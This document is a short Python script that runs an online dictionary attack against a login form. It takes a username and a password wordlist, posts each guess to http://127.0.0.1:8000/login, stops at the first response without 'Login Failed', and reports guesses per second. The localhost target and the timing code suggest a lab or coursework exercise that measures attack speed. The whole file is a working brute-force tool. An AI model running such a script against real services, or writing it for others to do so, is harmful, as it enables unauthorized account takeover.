#! /bin/python3

import sys
import requests
import time

url = 'http://127.0.0.1:8000/login'

def main(argv):
	assert (len(argv) == 3), "Invalid number of parameters"
	username = argv[1]
	dictionary_file = argv[2]
	parameters = {'uname': username}

	session = requests.Session()

	with open(dictionary_file, 'r') as dictionary:
		password_guesses = dictionary.read().splitlines()
		start = time.perf_counter()
		guess_counter = 0
		for guess in password_guesses:
			guess_counter += 1
			parameters["pword"] = guess
			response = session.post(url, parameters)
			#print(f"Received {response.status_code} with password {guess}.")
			if response.status_code == 200 and "Login Failed" not in response.text:
				print("{} is the correct password".format(guess))
				break
			

		end = time.perf_counter()
	performance = guess_counter/(end - start)
	print(f"Performance of online attack is: {performance} guesses/second")


	



if __name__ == "__main__":
    main(sys.argv)